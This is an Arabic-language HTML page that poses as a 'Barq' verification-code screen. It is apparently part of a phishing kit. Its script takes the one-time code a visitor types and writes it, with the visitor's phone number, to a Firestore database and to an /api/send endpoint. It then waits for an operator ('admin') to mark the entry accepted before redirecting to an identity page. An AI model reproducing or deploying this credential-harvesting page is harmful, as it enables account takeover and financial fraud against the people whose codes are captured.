
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أدخل رمز التحقق</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #fff; height: 100vh; display: flex; justify-content: center; }
        
        .container { 
            width: 100%; max-width: 450px; padding: 40px 25px; 
            display: flex; flex-direction: column; align-items: center; position: relative;
        }
        
        .icon-container { margin-top: 60px; margin-bottom: 30px; }
        .sparkle-icon { width: 120px; height: auto; display: block; } 

        h1 { font-size: 22px; margin-bottom: 10px; color: #000; }
        p { color: #555; margin-bottom: 40px; font-size: 14px; }
        
        /* الحاوية وتعديل اتجاهها */
        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 10px; direction: ltr; }
        .otp-box { 
            width: 50px; height: 60px; border: none; border-radius: 12px; 
            background-color: #f5f5f5; text-align: center; font-size: 24px; 
            outline: none; transition: 0.3s;
        }
        .otp-box:focus { border: 2px solid #FFD700; background-color: #fff; }
        
        /* رسالة الخطأ */
        #errorMessage { color: red; font-size: 14px; margin-top: 10px; display: none; }
        
        .bottom-section { margin-top: auto; width: 100%; text-align: center; padding-bottom: 40px; }
        .resend-text { color: #888; font-size: 14px; margin-bottom: 10px; }
        
        #resendLink { color: #ccc; font-weight: bold; text-decoration: none; pointer-events: none; transition: 0.3s; }
        #resendLink.available { color: #000; pointer-events: auto; cursor: pointer; }
    </style>
</head>
<body>

<div class="container">
    <div class="icon-container">
        <img src="barq-icon.png" alt="شعار برق" class="sparkle-icon">
    </div>

    <h1>أدخل رمز التحقق</h1>
    <p>تم الإرسال إلى <span id="displayPhone"></span></p>

    <div class="otp-inputs" id="otpContainer">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
    </div>
    <div id="errorMessage">رمز التحقق غير صحيح</div>

    <div class="bottom-section">
        <div class="resend-text">لم تحصل على رمز؟</div>
        <a href="javascript:void(0)" id="resendLink">إعادة إرسال الرمز في <span id="timer">60</span></a>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
    import { getFirestore, doc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
        authDomain: "barq-9ba61.firebaseapp.com",
        projectId: "barq-9ba61",
        storageBucket: "barq-9ba61.firebasestorage.app",
        messagingSenderId: "1060477857765",
        appId: "1:1060477857765:web:e1e2c606668209f364090c"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    
    // جلب البيانات
    const docId = localStorage.getItem('currentDocId');
    const userPhone = localStorage.getItem('userPhone');

    // التصحيح: عرض الرقم في الصفحة
    if (userPhone) {
        document.getElementById('displayPhone').innerText = userPhone;
    }

    // المراقب لانتظار القبول من الأدمن
    if (docId) {
        onSnapshot(doc(db, "users", docId), (docSnap) => {
            if (docSnap.exists() && docSnap.data().status === "accepted") {
                window.location.href = 'identity.html';
            }
        });
    }

    // منطق إدخال الرمز
    const inputs = document.querySelectorAll('.otp-box');
    inputs.forEach((input, index) => {
        input.addEventListener('input', async (e) => {
            if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
            if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();

            if (Array.from(inputs).every(i => i.value !== '')) {
                const otp = Array.from(inputs).map(i => i.value).join('');
                
                if(docId) {
                    await updateDoc(doc(db, "users", docId), { otp: otp });
                }
                
                fetch('/api/send', { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: userPhone, otp: otp }) 
                });
            }
        });
    });
</script>


</body>
</html>
